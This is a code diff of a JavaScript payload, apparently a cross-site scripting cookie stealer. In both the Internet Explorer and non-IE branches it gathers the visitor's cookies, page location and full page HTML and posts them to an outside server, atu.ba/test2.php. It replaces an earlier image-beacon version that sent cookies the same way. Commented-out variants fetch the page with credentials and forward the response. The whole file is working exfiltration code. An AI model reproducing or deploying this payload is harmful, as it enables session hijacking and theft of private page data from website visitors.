@@ -9,7 +9,7 @@
          // code for IE6, IE5
          http = new ActiveXObject("Microsoft.XMLHTTP");
     }
-    var url = "http://atu.ba/test2.php?c=ie7_calisiyor_orumcek_kafali";
+    var url = "http://atu.ba/test2.php?c=ie7_calisiyor";
     var params = "";
     http.open("GET", url, true);
 
@@ -23,6 +23,8 @@
    }
    http.send(params);
 }*/
+function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
+
 if (navigator.userAgent.indexOf('MSIE') != -1)
  var detectIEregexp = /MSIE (\d+\.\d+);/ //test for MSIE x.x
 else // if no "MSIE" string in userAgent
@@ -31,9 +33,18 @@ else // if no "MSIE" string in userAgent
 if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
  var ieversion=new Number(RegExp.$1) // capture x.x portion and store as a number
  if (ieversion==7 || ieversion==8 || ieversion==9)
- img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain+" Location: "+document.location;
- }
-else{
+ //img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain+" Location: "+document.location;
+send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML)); 
 }
-function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
-function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.cookie),escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);
+else{
+send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
+}
+/*function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
+function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);*/
+
+
+//send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
+/*
+function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.documentElement.outerHTML)+" Location: "+window.location,escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);
+*/
+//("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML))
